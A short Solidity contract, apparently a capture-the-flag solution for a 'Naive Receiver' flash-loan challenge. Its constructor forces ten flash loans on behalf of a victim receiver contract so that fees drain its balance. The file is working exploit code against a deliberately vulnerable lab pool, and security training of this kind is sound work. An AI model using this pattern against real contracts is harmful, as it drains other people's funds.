// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../naive-receiver/NaiveReceiverLenderPool.sol";
import "../naive-receiver/FlashLoanReceiver.sol";

contract PwnNaiveReceiver {
    constructor(address payable poolAddress, address receiveAddress) {
	NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(poolAddress);
	for (uint i = 0; i < 10; i++) {
	    pool.flashLoan(receiveAddress, 1);
	}
    }
}
